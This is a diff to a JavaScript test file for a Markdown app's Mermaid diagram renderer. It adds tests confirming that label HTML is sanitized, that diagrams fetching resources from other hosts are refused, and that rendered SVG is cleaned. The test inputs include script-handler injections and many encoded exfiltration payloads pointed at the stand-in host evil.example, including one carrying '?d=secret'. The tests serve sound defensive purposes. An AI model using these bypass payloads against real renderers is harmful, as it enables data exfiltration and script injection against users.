@@ -28,7 +28,9 @@ import { useMermaidRenderer } from '../../../client/src/hooks/useMermaidRenderer
 import { renderMarkdown } from '../../../client/src/config/marked.config';
 import {
   MERMAID_CONTAINER_TOKEN_ATTRIBUTE,
-  isTrustedMermaidContainer
+  isTrustedMermaidContainer,
+  mermaidExternalResourceReason,
+  sanitizeMermaidSvg
 } from '../../../client/src/utils/mermaidSecurity';
 
 const t = (key, fallback) => fallback;
@@ -40,9 +42,9 @@ const SET_SENTINEL = `window.${SENTINEL} = true`;
 const fence = source => `\`\`\`mermaid\n${source}\n\`\`\``;
 
 /** Renders Markdown the way the app does and puts the result into the page. */
-const mountMarkdown = markdown => {
+const mountMarkdown = (markdown, options) => {
   const host = document.createElement('div');
-  host.innerHTML = renderMarkdown(markdown);
+  host.innerHTML = renderMarkdown(markdown, options);
   document.body.appendChild(host);
   return host;
 };
@@ -89,6 +91,18 @@ describe('useMermaidRenderer', () => {
     expect(mermaid.initialize).toHaveBeenCalledWith(
       expect.objectContaining({ securityLevel: 'strict' })
     );
+    // Label HTML loses everything that loads or styles, and a diagram's own
+    // %%{init}%% or front matter can neither loosen that nor write CSS.
+    const config = mermaid.initialize.mock.calls[0][0];
+    expect(config.dompurifyConfig.FORBID_TAGS).toEqual(
+      expect.arrayContaining(['img', 'image', 'style', 'video', 'iframe'])
+    );
+    expect(config.dompurifyConfig.FORBID_ATTR).toEqual(
+      expect.arrayContaining(['style', 'src', 'srcset', 'background', 'class'])
+    );
+    expect(config.secure).toEqual(
+      expect.arrayContaining(['dompurifyConfig', 'themeCSS', 'fontFamily', 'securityLevel'])
+    );
   });
 
   test('renders diagram source and error message as text in the error state', async () => {
@@ -105,7 +119,7 @@ describe('useMermaidRenderer', () => {
     const source =
       'flowchart TD\n' +
       '  A[<b>marker</b>] --> B[Next]\n' +
-      `  B --> C[<img src="x" onerror="${SET_SENTINEL}">]`;
+      `  B --> C[<a onclick="${SET_SENTINEL}">x</a>]`;
     const host = mountMarkdown(fence(source));
     mermaid.render.mockRejectedValue(new Error('Parse error near <b>marker</b>'));
 
@@ -117,7 +131,7 @@ describe('useMermaidRenderer', () => {
     expect(container.querySelector('pre code').textContent).toBe(source);
     expect(container.textContent).toContain('Parse error near <b>marker</b>');
     expect(container.querySelector('b')).toBeNull();
-    expect(container.querySelector('img')).toBeNull();
+    expect(container.querySelector('a')).toBeNull();
 
     fireInlineHandlers(container);
     expect(window[SENTINEL]).toBeUndefined();
@@ -126,8 +140,9 @@ describe('useMermaidRenderer', () => {
   test('leaves diagram containers alone that the Markdown renderer did not create', async () => {
     const trustedSource = 'flowchart TD\n  A[Trusted] --> B[Diagram]';
     const lookAlikeCode = encodeURIComponent('flowchart TD\n  X[Look] --> Y[Alike]');
-    // Raw HTML in the content keeps class and data-* attributes through the
-    // Markdown sanitizer, so these reach the page as written.
+    // Raw HTML in trusted content (an admin's page) keeps class and data-*
+    // attributes through the Markdown sanitizer, so these reach the page as
+    // written. (Model output loses class and id on anything iHub did not create.)
     const host = mountMarkdown(
       [
         fence(trustedSource),
@@ -135,7 +150,8 @@ describe('useMermaidRenderer', () => {
         `<div class="mermaid-diagram-container" id="without-token" data-code="${lookAlikeCode}">untouched one</div>`,
         '',
         `<div class="mermaid-diagram-container" id="wrong-token" ${MERMAID_CONTAINER_TOKEN_ATTRIBUTE}="0123456789abcdef0123456789abcdef" data-code="${lookAlikeCode}">untouched two<button class="mermaid-fullscreen" data-svg="${encodeURIComponent('<p id="from-attribute">attribute</p>')}">Full</button></div>`
-      ].join('\n')
+      ].join('\n'),
+      { trusted: true }
     );
     mermaid.render.mockImplementation(async id => ({ svg: simpleSvg(id) }));
 
@@ -239,5 +255,110 @@ describe('useMermaidRenderer', () => {
 
     modal.querySelector('.close-fullscreen').click();
     expect(document.querySelector('.mermaid-fullscreen-modal')).toBeNull();
+  });
+
+  test('does not draw a diagram that would load from another site, and shows its source', async () => {
+    jest.spyOn(console, 'error').mockImplementation(() => {});
+    const source =
+      'flowchart TD\n' +
+      '  A[Start] --> B[Next]\n' +
+      '  B@{ shape: image, img: "https://evil.example/x.png?d=secret" }';
+    const host = mountMarkdown(fence(source));
+    mermaid.render.mockImplementation(async id => ({ svg: simpleSvg(id) }));
+
+    startHook();
+
+    const container = host.querySelector('.mermaid-diagram-container');
+    await waitFor(() => expect(container.querySelector('pre code')).not.toBeNull());
+    expect(mermaid.render).not.toHaveBeenCalled();
+    expect(container.querySelector('pre code').textContent).toBe(source);
+    expect(container.textContent).toContain('Diagram not drawn.');
+    expect(container.textContent).not.toContain('Syntax Error');
+  });
+});
+
+describe('mermaidExternalResourceReason', () => {
+  const blocked = {
+    'image shape on another host': 'flowchart TD\n  A@{ img: "https://evil.example/a.png" }',
+    'image shape, unquoted and multi-line':
+      'flowchart TD\n  A@{\n    shape: image\n    img: https://evil.example/a.png\n  }',
+    'image shape, protocol-relative': 'flowchart TD\n  A@{ img: "//evil.example/a.png" }',
+    'image shape, quoted key': 'flowchart TD\n  A@{ "img": "https://evil.example/a.png" }',
+    'image shape behind a YAML escape': 'flowchart TD\n  A@{ "\\x69mg": "/a.png" }',
+    'image shape behind a YAML alias':
+      'flowchart TD\n  A@{ label: &k img, *k : "https://evil.example/a.png" }',
+    'img tag in a label': 'flowchart TD\n  A["<img src=\'https://evil.example/a\'>"] --> B',
+    'img tag as Mermaid entities':
+      'flowchart TD\n  A["#60;img src=https://evil.example/a#62;"] --> B',
+    'img tag as HTML entities': 'flowchart TD\n  A["&lt;img src=https://evil.example/a&gt;"] --> B',
+    'style tag in a label': 'flowchart TD\n  A["<style>*{}</style>"] --> B',
+    'table background in a label':
+      'flowchart TD\n  A["<table background=https://evil.example/t>"] --> B',
+    'classDef with url()':
+      'flowchart TD\n  A:::x --> B\n  classDef x background-image:url(https://evil.example/b)',
+    'style with escaped url()':
+      'flowchart TD\n  A --> B\n  style A background:\\75 rl(https://evil.example/b)',
+    'themeCSS @import in a directive':
+      '%%{init: {"themeCSS": "@import \\"https://evil.example/s.css\\";"}}%%\nflowchart TD\n  A --> B',
+    'url() behind a JSON escape':
+      '%%{init: {"fontFamily": "x; background:\\u0075rl(https://evil.example/f)"}}%%\nflowchart TD\n  A --> B',
+    'front matter themeCSS':
+      '---\nconfig:\n  themeCSS: ".node rect { fill: url(https://evil.example/p.svg#g) }"\n---\nflowchart TD\n  A --> B',
+    'image-set()': 'flowchart TD\n  A --> B\n  style A background-image:image-set("x.png" 1x)'
+  };
+
+  test.each(Object.entries(blocked))('%s is refused', (_, code) => {
+    expect(mermaidExternalResourceReason(code)).not.toBe('');
+  });
+
+  const allowed = {
+    'a plain flowchart': 'flowchart TD\n  A[Start] --> B{Ok?}\n  B -->|yes| C[Done]',
+    'styles without loads':
+      'flowchart TD\n  A:::hot --> B\n  classDef hot fill:#f96,stroke:#333,stroke-width:4px\n  style B fill:#bbf',
+    'theme variables':
+      "%%{init: {'theme':'base','themeVariables':{'primaryColor':'#ff0000'}}}%%\nflowchart TD\n  A --> B",
+    'a node named url with a round label':
+      'flowchart LR\n  url(Enter address) --> fetch[Fetch page]',
+    'line breaks and bold in labels': 'flowchart TD\n  A["first<br/>second <b>bold</b>"] --> B',
+    'shape metadata without an image': 'flowchart TD\n  A@{ shape: rounded, label: "R and D" }',
+    'an image shape on this server': 'flowchart TD\n  A@{ img: "/uploads/logo.png", shape: image }',
+    'an inline data image': 'flowchart TD\n  A@{ img: "data:image/png;base64,iVBORw0KGgo=" }',
+    'a sequence diagram': 'sequenceDiagram\n  Alice->>Bob: Hello\n  Bob-->>Alice: Hi',
+    'math in a label': 'flowchart TD\n  A["$$x^2 + \\frac{1}{2}$$"] --> B'
+  };
+
+  test.each(Object.entries(allowed))('%s is drawn', (_, code) => {
+    expect(mermaidExternalResourceReason(code)).toBe('');
+  });
+});
+
+describe('sanitizeMermaidSvg', () => {
+  test('removes references to other hosts and keeps in-document ones', () => {
+    const svg =
+      '<svg id="d" xmlns="http://www.w3.org/2000/svg">' +
+      '<style>#d .node rect{fill:#fff}</style>' +
+      '<style>#d .x{background:url(https://evil.example/b)}</style>' +
+      '<defs><marker id="arrow"></marker></defs>' +
+      '<path marker-end="url(#arrow)" style="stroke:#333"></path>' +
+      '<rect style="fill:url(https://evil.example/p.svg#g)"></rect>' +
+      '<image href="https://evil.example/i.png"></image>' +
+      '<image href="/uploads/local.png"></image>' +
+      '<foreignObject><div xmlns="http://www.w3.org/1999/xhtml"><img src="https://evil.example/l.png" alt="L"></div></foreignObject>' +
+      '</svg>';
+    const host = document.createElement('div');
+    host.innerHTML = sanitizeMermaidSvg(svg);
+
+    expect(host.innerHTML).not.toContain('evil.example/b');
+    expect(host.innerHTML).not.toContain('evil.example/p.svg');
+    expect(host.innerHTML).not.toContain('evil.example/i.png');
+    expect(host.querySelector('foreignObject img, foreignobject img')).toBeNull();
+    expect(host.querySelectorAll('style')).toHaveLength(1);
+    expect(host.querySelector('path').getAttribute('marker-end')).toBe('url(#arrow)');
+    expect(host.querySelector('path').getAttribute('style')).toBe('stroke:#333');
+    expect(host.querySelector('rect').hasAttribute('style')).toBe(false);
+    const images = host.querySelectorAll('image');
+    const hrefs = Array.from(images, image => image.getAttribute('href'));
+    expect(hrefs).toContain('/uploads/local.png');
+    expect(hrefs.filter(Boolean)).toEqual(['/uploads/local.png']);
   });
 });
